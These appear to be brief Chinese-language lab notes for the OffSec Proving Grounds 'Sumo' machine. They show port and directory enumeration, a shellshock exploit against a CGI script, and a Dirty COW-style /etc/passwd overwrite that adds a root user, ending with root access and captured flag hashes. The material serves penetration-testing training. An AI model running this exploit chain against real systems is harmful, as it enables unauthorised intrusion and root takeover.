参考资料：  
[https://medium.com/@cdspacetilde/offsec-proving-grounds-sumo-a3818841c962](https://medium.com/@cdspacetilde/offsec-proving-grounds-sumo-a3818841c962)
   

基础环境配置
    
Sumo
 
192.168.212.87
 
gobuster dir -u [http://sumo](http://sumo) | tee enum/gobuster -w /usr/share/dirb/wordlists/big.txt
   

┌──(kali㉿kali)-[~/Desktop/pg02/Sumo]  
└─$ nmap -sS -T4 -sV -p- 192.168.212.87  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-14 09:44 EST  
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 0.65% done  
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 0.73% done  
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 0.84% done  
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 0.92% done  
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 12.84% done; ETC: 09:47 (0:02:22 remaining)  
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 12.89% done; ETC: 09:47 (0:02:22 remaining)  
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 12.95% done; ETC: 09:47 (0:02:21 remaining)  
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 13.02% done; ETC: 09:47 (0:02:20 remaining)  
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 13.10% done; ETC: 09:47 (0:02:26 remaining)  
Nmap scan report for 192.168.212.87  
Host is up (0.088s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)  
80/tcp open http Apache httpd 2.2.22 ((Ubuntu))  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 60.83 seconds   ┌──(kali㉿kali)-[~/Desktop/pg02/Sumo]  
└─$
       
[http://sumo//cgi-bin/](http://sumo//cgi-bin/)
    
python3 shellshock.py 192.168.212.87 8080 [http://sumo/cgi-bin/test](http://sumo/cgi-bin/test)
   

diyige  
c6f0a16fb4e50eca0718562adbb5e0f0
   

python -c 'import pty;pty.spawn("/bin/bash")'
    
export PATH="/usr/lib/gcc/x86_64-linux-gnu/4.8/:$PATH"
       
www-data@ubuntu:/tmp$ chmod u+x ./dirty && ./dirty bl0b  
chmod u+x ./dirty && ./dirty bl0b  
/etc/passwd successfully backed up to /tmp/passwd.bak  
Please enter the new password: bl0b  
Complete line:  
toor:tobgsf4lB53dc:0:0:pwned:/root:/bin/bash
 
mmap: 7fec5991a000  
id
   

dierge  
www-data@ubuntu:/tmp$ su toor  
su toor  
Password: bl0b
 
toor@ubuntu:/tmp# id  
id  
uid=0(toor) gid=0(root) groups=0(root)  
toor@ubuntu:/tmp# cd /root  
cd /root  
toor@ubuntu:~# ls  
ls  
proof.txt root.txt  
toor@ubuntu:~# cat proof.txt  
cat proof.txt  
a9991ec454d31023d0f94995b05c3786  
toor@ubuntu:~#